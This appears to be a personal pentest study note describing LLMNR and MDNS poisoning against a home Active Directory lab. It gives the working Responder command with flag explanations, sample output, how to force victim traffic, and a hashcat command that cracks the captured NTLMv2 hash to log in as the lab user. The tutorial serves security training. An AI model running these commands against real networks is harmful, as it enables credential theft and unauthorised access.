
# Capturing Hashes with [Responder](/cybersecurity/tools/exploitation/responder.md)
Responder is a tool which can be used to perform [LLMNR poisoning](/PEH/active-directory/initial-vectors/LLMNR-poisoning.md) attacks on an [active directory](/computers/windows/active-directory/active-directory.md) domain. [LLMNR](/networking/protocols/LLMNR.md) is not the only protocol which responder can do a poisoning attack on. It can also be used against [NBT-NS](/networking/protocols/NBT-NS.md) and [MDNS](/networking/protocols/MDNS.md).
## Example Usage
Against our AD lab, we're going to use Responder to perform LLMNR poisoning. This will allow us to capture the hash sent for authentication from the victim machine. Once we have the hash, we can crack it to get the password for that machine.

With our AD lab up and active, we're going to use the following command with responder to attack the [domain controller](/computers/windows/active-directory/domain-controller.md)
```bash
responder -I eth0 -dwP
```
### Flags used:
- `-I/ --interface`: tells responder which network interface we want to use.
- `-d/ --DHCP`: tells responder to *also respond* to [DHCP](/networking/protocols/DHCP.md) broadcast requests.
- `-w/ --wpad`: starts a rogue [WPAD](/computers/windows/active-directory/WPAD.md) server (which will respond to hostname resolution requests)
- `-P/ --ProxyAuth`: tells Responder to force NTLM authentication (even if the target network doesn't have WPAD on)
- **OTHER**: `-v/ --verbose`: Will add hashes which you've already captured to the output.
With these flags on, and your attack box on the *same network* as the domain and domain computers, the output should look like this:
```bash
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.2.4]
    Responder IPv6             [fe80::a00:27ff:fed8:d39f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-06P8C35WKXO]
    Responder Domain Name      [SZWS.LOCAL]
    Responder DCE-RPC Port     [45001]

[+] Listening for events... 
```
Note that all of the poisoner and server types should be on. If you've used Responder before, and changed these, then change them back. Responder is now *listening to your `eth0` interface* for incoming packets related to the listed  protocols.
## Forcing Some Traffic
In a real pentest, you might not see any traffic until staff in the client organization actually login to their AD accounts. So, to force some traffic in our lab simulation, we can login to one of our regular domain VMs.
### Traffic From Powering Up Host
![](PNPT/PNPT-pics/active-directory-9.png)
![](/PNPT-pics/active-directory-9.png)
This is the traffic I was able to capture simply by powering on one of my AD user boxes (haven't logged in as that user yet). This traffic tells us that an MDNS (multicast DNS) request to resolve the hostname *`TRASHCAN.local`*. Our rogue server *responded w/ a poisoned answer* (which was sent to our user box which we powered up).
### Searching for IP in filesystem
Now, if we go to the user VM's File Explorer and search for the IP *of our attacking machine* we get the following hash in Responder:
![](PNPT/PNPT-pics/active-directory-10.png)
![](/PNPT-pics/active-directory-10.png)
This screenshot shows the hash our rogue server received when Dan Dumpster searched for our attacking IP address while logged in to a domain computer. Now that we have the hash (which is an DES-made hash) we can easily crack it to get Dan Dumpster's password.
## Cracking the Hash
To crack this hash, we're going to use [Hashcat](/cybersecurity/tools/cracking/hashcat.md). Hashcat is a cracking program which *ideally* uses GPU processing to crack hashes in many different formats. To crack this hash, we're going to specify a value of 5600 to the `-m` flag. This tells hashcat that we're cracking an [NTLMv2](/networking/protocols/NTLM.md) hash.

To give hashcat the hash, copy and paste the entire hash into a file called `hashes.txt`. The hash includes the username and password, so everything from `ddumpster::LANDFILL:...` to `...00000000` at the very end (in my example).

Once that's saved in a file, the command we use w/ hashcat is as follows:
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```
We're also using the RockYou [wordlist](/cybersecurity/tools/scanning-enumeration/wordlists/seclists.md) which hashcat will use to generate hashes to try and match the one we're looking for. Even in a VM, this crack only takes hashcat about 16 seconds:
![](PNPT/PNPT-pics/active-directory-11.png)
Now we can log in as Dan Dumpster!

> [!Resources]
> - My other notes (linked throughout), all of which can be found [here](https://github.com/TrshPuppy/obsidian-notes)
